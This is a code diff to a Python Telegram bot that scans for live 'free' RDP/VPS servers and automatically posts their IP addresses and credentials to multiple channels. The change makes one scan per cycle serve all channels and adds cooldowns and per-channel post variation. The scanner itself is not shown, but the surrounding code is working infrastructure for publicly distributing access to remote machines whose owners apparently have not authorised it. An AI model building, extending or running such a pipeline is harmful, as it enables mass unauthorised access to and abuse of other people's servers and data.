@@ -4,9 +4,15 @@ Auto-poster — only posts free RDP/VPS scan results.
 One post type only:
   - RDP scanner finds a live free server → posts its credentials
   - Scan fails or finds nothing → skips this cycle (no fallback AI posts)
+
+KEY DESIGN:
+  Scan ONCE per cycle, then post the same IP to ALL channels that are
+  ready (not on cooldown). This way a scan timeout never blocks some
+  channels because of another channel's failed scan.
 """
 import asyncio
 import hashlib
+import io
 import random
 import time as _time
 import uuid
@@ -14,7 +20,7 @@ from collections import deque
 from datetime import datetime, timezone
 from zoneinfo import ZoneInfo
 
-from sqlalchemy import select, desc
+from sqlalchemy import select
 from app.db.session import AsyncSessionLocal
 from app.models.channel import TelegramChannel
 from app.models.post import Post
@@ -76,18 +82,14 @@ def _record_hash(content: str) -> None:
 
 
 async def _post_to_channel(userbot_manager, channel: TelegramChannel) -> bool:
-    """Post ONLY if a live free RDP/VPS server is found by the scanner.
-    Returns True on success, False if scan found nothing or posting failed.
-    No AI-generated fallback — either a real server is posted or nothing is.
     """
-    lang = channel.language or "en"
-    if lang == "fa":
-        lang = "en"
-
+    Scan for a live RDP server and post it to a single channel.
+    Used by the admin 'post_now' button which posts one channel at a time.
+    For the auto-poster loop use _post_rdp_result_to_channel() instead
+    so the scan is shared across all channels in one cycle.
+    """
     try:
         from app.services.scanner.rdp_scanner import scan_for_rdp
-        from app.services.content.rdp_post_builder import build_rdp_post
-
         rdp_result = await asyncio.wait_for(scan_for_rdp(), timeout=45.0)
     except asyncio.TimeoutError:
         logger.warning("rdp_scan_timeout_skipping_channel", channel=channel.display_name)
@@ -99,6 +101,21 @@ async def _post_to_channel(userbot_manager, channel: TelegramChannel) -> bool:
     if not rdp_result:
         logger.info("rdp_scan_no_result_skipping", channel=channel.display_name)
         return False
+
+    return await _post_rdp_result_to_channel(rdp_result, channel)
+
+
+async def _post_rdp_result_to_channel(rdp_result: dict, channel: TelegramChannel) -> bool:
+    """
+    Post an already-scanned RDP result to a single channel.
+    Accepts a pre-scanned rdp_result so one scan can serve all channels
+    in the same cycle — no redundant scans, no blocked channels.
+    """
+    from app.services.content.rdp_post_builder import build_rdp_post
+
+    lang = channel.language or "en"
+    if lang == "fa":
+        lang = "en"
 
     unique_seed = random.randint(100_000, 99_999_999)
     rdp_content, rdp_image_url = build_rdp_post(
@@ -156,6 +173,17 @@ async def _get_active_channels(account_id=None):
 
 
 async def run_auto_poster(userbot_manager):
+    """
+    Main auto-poster loop.
+
+    FIX: Previously called _post_to_channel() per channel, which ran a
+    separate scan for EACH channel. A scan timeout on channel N blocked
+    channels N+1, N+2, ... and caused some channels to never post.
+
+    Now: scan ONCE per cycle, post the result to ALL ready channels.
+    Each channel still gets its own per-channel cooldown and its own
+    post text (different seed → different channel tag line).
+    """
     logger.info("auto_poster_started — rdp_only_mode")
     await asyncio.sleep(30)
 
@@ -172,26 +200,66 @@ async def run_auto_poster(userbot_manager):
                 await asyncio.sleep(300)
                 continue
 
-            posted = 0
-
-            for channel in channels:
-                ch_key = str(channel.id)
-                cooldown = await get_cooldown_remaining(ch_key)
+            # ── Step 1: Find channels ready to post ──────────────────────────
+            ready_channels = []
+            for ch in channels:
+                cooldown = await get_cooldown_remaining(str(ch.id))
                 if cooldown > 0:
-                    logger.info("auto_poster_channel_cooldown",
-                                channel=channel.display_name,
-                                remaining_minutes=cooldown // 60)
-                    continue
+                    logger.info(
+                        "auto_poster_channel_cooldown",
+                        channel=ch.display_name,
+                        remaining_minutes=cooldown // 60,
+                    )
+                else:
+                    ready_channels.append(ch)
 
-                success = await _post_to_channel(userbot_manager, channel)
+            if not ready_channels:
+                # All channels are on cooldown — check back in 10 min
+                logger.info("auto_poster_all_channels_on_cooldown", count=len(channels))
+                await asyncio.sleep(600)
+                continue
+
+            # ── Step 2: Scan ONCE for a live server ──────────────────────────
+            # One scan serves all ready channels — no redundant scans.
+            from app.services.scanner.rdp_scanner import scan_for_rdp
+            try:
+                rdp_result = await asyncio.wait_for(scan_for_rdp(), timeout=45.0)
+            except asyncio.TimeoutError:
+                logger.warning("auto_poster_rdp_scan_timeout")
+                await asyncio.sleep(300)
+                continue
+            except Exception as scan_err:
+                logger.error("auto_poster_rdp_scan_error", error=str(scan_err))
+                await asyncio.sleep(300)
+                continue
+
+            if not rdp_result:
+                logger.info("auto_poster_rdp_no_result_sleeping_5min")
+                await asyncio.sleep(300)
+                continue
+
+            logger.info(
+                "auto_poster_rdp_found",
+                ip=rdp_result["ip"],
+                country=rdp_result["country_name"],
+                ready_channels=len(ready_channels),
+            )
+
+            # ── Step 3: Post to every ready channel ───────────────────────────
+            posted = 0
+            for ch in ready_channels:
+                success = await _post_rdp_result_to_channel(rdp_result, ch)
                 if success:
-                    await mark_channel_posted(ch_key)
+                    await mark_channel_posted(str(ch.id))
                     posted += 1
-                    await asyncio.sleep(random.randint(10, 30))
+                    # Short pause between channels to avoid flood
+                    await asyncio.sleep(random.randint(3, 8))
 
+            logger.info("auto_poster_cycle_done", posted=posted, total_ready=len(ready_channels))
+
+            # ── Step 4: Sleep before next cycle ──────────────────────────────
+            # 15 min if we posted something, 10 min if all failed
             await asyncio.sleep(900 if posted > 0 else 600)
-            if posted > 0:
-                logger.info("auto_poster_cycle_done", posted=posted)
 
         except asyncio.CancelledError:
             logger.info("auto_poster_cancelled")
